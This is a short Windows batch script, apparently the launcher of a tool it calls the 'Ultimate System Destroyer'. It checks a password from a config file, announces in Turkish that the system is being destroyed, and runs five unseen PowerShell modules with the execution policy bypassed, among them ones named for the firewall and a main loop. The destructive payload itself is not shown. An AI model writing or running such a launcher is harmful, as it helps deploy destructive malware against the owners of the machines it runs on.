@echo off
chcp 65001 >nul
title EN - Ultimate System Destroyer
color 0c
cls

:: ============================================================
:: ŞİFRE KONTROLÜ
:: ============================================================
if exist config.txt (
    for /f "tokens=1,2 delims==" %%a in (config.txt) do (
        if "%%a"=="SIFRE" set sifre=%%b
    )
)

if defined sifre if not "%sifre%"=="" (
    set /p girilen="[EN] Sifre: "
    if not "%girilen%"=="%sifre%" (
        echo [EN] Hatali sifre.
        timeout /t 2 /nobreak >nul
        exit
    )
)

:: ============================================================
:: ANA MENU
:: ============================================================
echo ============================================================
echo   EN AKTIF
echo ============================================================
echo   Sistem yok ediliyor...
echo ============================================================
echo.
echo   Devam etmek icin bir tusa basin...
pause >nul

:: ============================================================
:: MODULLER
:: ============================================================
powershell -ExecutionPolicy Bypass -File modul_guvenlik_duvari.ps1
if %errorlevel% neq 0 exit

powershell -ExecutionPolicy Bypass -File modul_bagimlilik_kontrol.ps1
powershell -ExecutionPolicy Bypass -File modul_kendi_tamir.ps1
powershell -ExecutionPolicy Bypass -File modul_config_oku.ps1
powershell -ExecutionPolicy Bypass -File modul_ana_dongu.ps1